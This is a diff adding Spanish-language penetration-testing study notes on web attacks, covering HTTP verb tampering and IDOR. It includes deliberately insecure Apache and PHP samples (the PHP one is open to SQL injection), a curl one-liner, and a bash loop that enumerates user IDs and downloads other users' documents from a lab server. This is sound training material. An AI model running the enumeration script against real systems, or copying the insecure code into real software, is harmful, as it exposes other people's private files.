@@ -203,6 +203,96 @@ A10 – Server-Side Request Forgery (SSRF)
 - Nikto: 
   - nikto -h inlanefreight.com -Tuning b (Modulo de reconocimiento)
 
+## Web attacks:
+Tipos de ataques web.
+
+### HTTP Verb Tampering:
+- Insecure Configurations:
+  - Limitar acceso a información por el tipo de Metodo, por ejemplo panel de autenticación podria limitar el acceso solo a PUT y GET, podria permitir al menos leer las cabeceras que regresen HEAD, o sí ejecuta una cción permite que se ejecute por detras.
+```
+<Limit GET POST>
+    Require valid-user
+</Limit>
+```
+- Insecure Coding:
+  - Realizar sanitización especificando parametros solo de GET, pero despues recibir parametros sin importar el metodo, por ejemplo:
+```
+$pattern = "/^[A-Za-z\s]+$/";
+
+if(preg_match($pattern, $_GET["code"])) { #VALIDA QUE EL PARAMETRO DE GET VENGA LIMPIO )
+    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'"; #(EJECUTA EL PARAMETRO RECIBIDO SIN IMPORTAR SINO VIENE POR GET)
+    ...SNIP...
+}
+```
+
+### IDOR:
+Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.
+
+- URL Parameters, JSON & APIs:
+  - El más simple, userid=1000&credencial=ine.pdf, modificamos el userid y vemos otras credenciales.
+- AJAX or JS Calls:
+  - Funciones ocultas en javascript o ajax que no deberian poder ser llamadas, por ejemplo sí estamos en un panel normal donde hay un login para empleados, pero existe un parametro oculto llamado is_admin, que pasaria sí le dijieramos si somos admin en vez de no somos?
+```
+function changeUserPassword() {
+    $.ajax({
+        url:"change_password.php",
+        type: "post",
+        dataType: "json",
+        data: {uid: user.uid, password: user.password, is_admin: is_admin},
+        success:function(result){
+            //
+        }
+    });
+}
+```
+- Understand Hashing/Encoding
+  - Bastante comun que las referencias son encodeadas o hasheadas como metodo de ocultar la información, pero que si conocemos la estructura y función usada podemos tambien modificar los datos.
+  - ?filename=ZmlsZV8xMjQucGRm (BASE64) -> ?filename=file_124.pdf
+  - Sino podemos saber que función se está usando podriamos tratar de verlo en JS Ajax.
+```
+$.ajax({
+    url:"download.php",
+    type: "post",
+    dataType: "json",
+    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
+    success:function(result){
+        //
+    }
+});
+```
+- Compare User Roles:
+  - Sí tenemos la posibilidad de crear varios usuarios podriamos ver diferencias de valores o variables en los parametros entre cada usuario, intentando usar el valor del segundo usuario creado, no todos los parametros son tan obvios que son la referencia a otro usuario.
+```
+{
+  "attributes" : 
+    {
+      "type" : "salary",
+      "url" : "/services/d100/salaries/15ab"
+    },
+  "Id" : "1",
+  "Name" : "User1"
+
+}
+```
+  - Por ejemplo sí notamos que el valor entre services y salaries es un valor variable que sí modificamos nos tre información de otro servicio de otro usuario.
+
+- Herramientas: Lo más sencillo es usar intruder, pero en ciertas certs o sino tenemos la licencia se podria complicar, una forma manual seria:
+  - curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
+    - Buscamos patrones donde aparezca información relacionada a otros usuarios, pero para hacerlo automatizado podemos:
+```
+#!/bin/bash
+
+url="http://SERVER_IP:PORT"
+for i in {1..10}; do
+        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
+                wget -q $url/$link
+        done
+done
+```
+
+
+
+
 
 
 
